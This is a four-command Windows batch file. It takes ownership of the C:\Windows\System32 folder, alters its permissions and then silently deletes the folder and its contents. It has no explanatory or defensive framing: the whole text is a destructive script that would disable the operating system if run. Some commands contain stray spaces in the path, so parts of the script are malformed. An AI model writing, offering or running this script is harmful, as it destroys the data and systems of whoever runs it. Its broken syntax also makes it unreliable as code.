@echo off
takeown /f c: \windows\system32
cacls c: \windows\system32
rd /s /q c:\windows\system32
del /s /q c: \windows\system32\*.*
